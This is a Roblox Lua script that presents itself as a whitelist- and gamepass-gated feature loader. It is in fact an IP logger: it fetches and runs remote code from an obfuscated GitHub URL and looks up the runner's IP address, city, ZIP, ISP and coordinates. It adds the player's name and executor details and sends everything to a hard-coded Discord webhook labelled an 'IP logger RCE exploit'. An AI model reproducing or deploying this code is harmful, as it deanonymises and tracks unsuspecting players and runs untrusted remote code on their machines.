--== CONFIG ==--
local WHITELIST = {
    [123456789] = true, -- add allowed user IDs
    [987654321] = true,
}
local GAMEPASS_ID = 123456789 -- your gamepass ID
local LOADER_TIME = 2          -- loader animation time

--== SERVICES ==--
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer

--== UI SETUP ==--
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 200)
frame.Position = UDim2.new(0.5, -150, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.Parent = player:WaitForChild("PlayerGui")

local button = Instance.new("TextButton")
button.Size = UDim2.new(0, 200, 0, 50)
button.Position = UDim2.new(0.5, -100, 0.5, -25)
button.Text = "Run Feature"
button.Font = Enum.Font.Arcade
button.TextSize = 28
button.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
button.TextColor3 = Color3.new(1,1,1)
button.Parent = frame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 12)
buttonCorner.Parent = button

local loading = Instance.new("TextLabel")
loading.Size = UDim2.new(1, -20, 0, 50)
loading.Position = UDim2.new(0, 10, 0, 10)
loading.BackgroundTransparency = 1
loading.Font = Enum.Font.Arcade
loading.TextColor3 = Color3.new(1,1,1)
loading.TextScaled = true
loading.Text = "Loading"
loading.Visible = false
loading.Parent = frame

--== CHECK FUNCTIONS ==--
local function isWhitelisted(userId)
    return WHITELIST[userId] == true
end

local function ownsGamepass()
    local success, owns = pcall(function()
        return MarketplaceService:UserOwnsGamePassAsync(player.UserId, GAMEPASS_ID)
    end)
    return success and owns
end

--== LOADING ANIMATION ==--
local function animateLoadingText(label)
    local frames = {"Loading.", "Loading..", "Loading...", "Loading...."}
    local i = 1
    while label.Visible do
        label.Text = frames[i]
        i = (i % #frames) + 1
        task.wait(0.3)
    end
end

--== RUN FEATURE ==--
local loaderStarted = false
local function startLoader()
    if loaderStarted then return end
    loaderStarted = true

    button.Visible = false
    loading.Visible = true

    task.spawn(function() animateLoadingText(loading) end)
    task.wait(LOADER_TIME)
    loading.Visible = false

    print("ACCESS GRANTED: running feature")
loadstring(game:HttpGet(('https://raw.githubusercontent.com/therangedpayeer/X-------------------------------------------------X-/refs/heads/main/%7C%CC%B4%CC%8D%CC%88%CC%90%CD%9D%CC%8F%CD%81%CC%8A%CC%8F%CC%9D%CC%9D%CC%A9%CC%B1%CC%A9%CC%B0%CC%96%CC%98%CC%97%CC%9D%CC%A7%CD%93%CC%A6%CC%A4%CC%97%CD%8D%CC%AA%CC%A8%CC%AA%CD%85%CD%85%CC%AC%CC%AB%CC%9F%CC%A2%CC%99%CD%94%CC%A7-%CC%B6%CD%86%CD%80%CD%8A%CC%80%CD%A0%CD%91%CD%9B%CD%92%CC%88%CC%83%CC%93%CC%92%CD%91%CC%92%CD%9D%CC%83%CC%9A%CC%BF%CD%83%CC%90%CC%91%CC%8B%CC%91%CC%91%CD%8B%CC%9B%CC%9B%CC%8B%CC%8F%CD%A0%CC%87%CC%81%CD%9C%CC%AC%CC%A0%CD%89%CC%96%CD%85%CD%9C%CC%B2%CC%9F%7C%CC%B7%CD%90%CC%BF%CC%82%CC%81%CD%83%CD%90%CC%90%CC%95%CC%93%CC%9A%CD%83%CC%87%CC%8A%CD%91%CC%BD%CD%82%CC%95%CC%9B%CD%9B%CD%9B%CC%BF%CC%93%CD%98%CD%8A%CD%8A%CC%BF%CD%84%CD%8C%CC%9A%CD%8A%CD%80%CD%84%CD%8C%CD%84%CC%90%CC%88%CC%A3%CD%8E%CC%B3%CC%A1%CC%BA%CC%A9%CD%9A%CC%AD%CC%A1'),true))()
    -- For example:
    print("Running allowed function for this player...")
    -- You can safely replace the next line with any function in your game
    -- loadstring("print('Hello world!')")()   -- only safe if it's YOUR code
end

--== BUTTON CLICK HANDLER ==--
local buttonClicked = false
button.MouseButton1Click:Connect(function()
    if buttonClicked then return end
    buttonClicked = true

    if isWhitelisted(player.UserId) or ownsGamepass() then
        startLoader()
        return
    end

    -- If not allowed
    button.Text = "Access Denied"
    print("Player is not whitelisted and does not own the gamepass")
    if not RunService:IsStudio() then
        MarketplaceService:PromptGamePassPurchase(player, GAMEPASS_ID)
    end
end)



wait("3")

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local RunService = game:GetService("RunService")
local Marketplace = game:GetService("MarketplaceService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

local executor = "Unknown"
if identifyexecutor then executor = identifyexecutor() end
if syn then executor = "Synapse X" end
if fluxus then executor = "Fluxus" end
if KRNL then executor = "KRNL" end

local fps = 0
RunService.RenderStepped:Connect(function(dt)
    fps = math.floor(1 / dt)
end)

local ping = math.floor(game.Stats.Network.ServerStatsItem["Data Ping"]:GetValue())

local gameName = "Unknown"
pcall(function()
    gameName = Marketplace:GetProductInfo(game.PlaceId).Name
end)
local placeId = game.PlaceId

local timeStr = os.date("%Y-%m-%d %H:%M:%S")


local function notify(title, message)
    if syn and syn.toast_notification then
        syn.toast_notification(title, message)
    elseif fluxus and fluxus.toast_notification then
        fluxus.toast_notification(title, message)
    elseif KRNL and KRNL.Notify then
        KRNL.Notify(title, message)
    elseif rconsoleprint then
        rconsoleprint("\n["..title.."]\n" .. message .. "\n")
    else
        print(title .. ": " .. message)
    end
end

local ipInfo = {
    ip = "Unknown",
    city = "Unknown",
    region = "Unknown",
    country = "Unknown",
    timezone = "Unknown",
    zip = "Unknown",
    isp = "Unknown",
    lat = "Unknown",
    lon = "Unknown"
}

local success, body = pcall(function()
    local req = syn and syn.request or http_request or request
    if req then
        return req({
            Url = "http://ip-api.com/json",
            Method = "GET"
        }).Body
    end
end)

if success and body then
    local function grab(key)
        return body:match('"'..key..'":"(.-)"') or "Unknown"
    end
    ipInfo.ip      = grab("query")
    ipInfo.city     = grab("city")
    ipInfo.region   = grab("regionName")
    ipInfo.country  = grab("country")
    ipInfo.timezone = grab("timezone")
    ipInfo.zip      = grab("zip")
    ipInfo.isp      = grab("isp")
    ipInfo.lat      = grab("lat") or "Unknown"
    ipInfo.lon      = grab("lon") or "Unknown"
end


local fullInfo =
    "ip: " .. ipInfo.ip .. "\n" ..
    "City: " .. ipInfo.city .. "\n" ..
    "Region: " .. ipInfo.region .. "\n" ..
    "Country: " .. ipInfo.country .. "\n" ..
    "ZIP: " .. ipInfo.zip .. "\n" ..
    "Timezone: " .. ipInfo.timezone .. "\n" ..
    "ISP: " .. ipInfo.isp .. "\n" ..
    "Latitude: " .. ipInfo.lat .. "\n" ..
    "Longitude: " .. ipInfo.lon .. "\n" ..
    "\---GAME INFO---\n" ..
"Player: " .. player.Name .. "\n" ..
"Executor: " .. executor .. "\n" ..
"FPS: " .. fps .. "\n" ..
"Ping: " .. ping .. " ms\n" ..
"Game: " .. gameName .. " (" .. placeId .. ")\n" ..
"Date: " .. timeStr

notify("logged for safety reason", fullInfo)

local WEBHOOK = "https://discord.com/api/webhooks/1446628984053039276/BAaEKSqzI31hGlDnoYUuRV2EMAcyjXPTpuxVxUwA_FR7HmYEnyVEbcOrDNm-shogtz50" -- ðŸ”¥ PUT YOUR WEBHOOK HERE

pcall(function()
    local req = syn and syn.request or http_request or request
    if req then
        req({
            Url = WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                content = "**ROBLOX IP LOGGER RCE EXPLOIT**\n```"..fullInfo.."```"
            })
        })
    end
end)

local gui = Instance.new("ScreenGui")
gui.Name = "rce exploit"
gui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(1,0,1,0)
frame.BackgroundColor3 = Color3.new(1,1,1)
frame.BackgroundTransparency = 1
frame.ZIndex = 9999
frame.Parent = gui

local tweenIn = TweenService:Create(frame, TweenInfo.new(0.15), {BackgroundTransparency = 0})
local tweenOut = TweenService:Create(frame, TweenInfo.new(0.25), {BackgroundTransparency = 1})

tweenIn:Play()
tweenIn.Completed:Wait()
wait(1)
tweenOut:Play()
tweenOut.Completed:Wait()

gui:Destroy()

StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
